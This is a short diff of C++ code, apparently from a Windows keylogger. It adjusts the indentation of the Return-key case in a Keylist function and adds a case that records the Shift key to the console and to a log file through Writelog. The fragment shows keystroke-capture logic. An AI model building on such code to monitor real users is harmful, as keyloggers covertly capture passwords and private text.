@@ -26,7 +26,11 @@ bool Keylist(int iKey){
             cout << " ";
             Writelog(" ");
             break;
-		 case VK_RETURN:
+		case VK_RETURN:
             cout << "\n";
             Writelog("\n");
+            break;
+		case VK_SHIFT:
+            cout << " shift ";
+            Writelog(" Shift ");
             break;
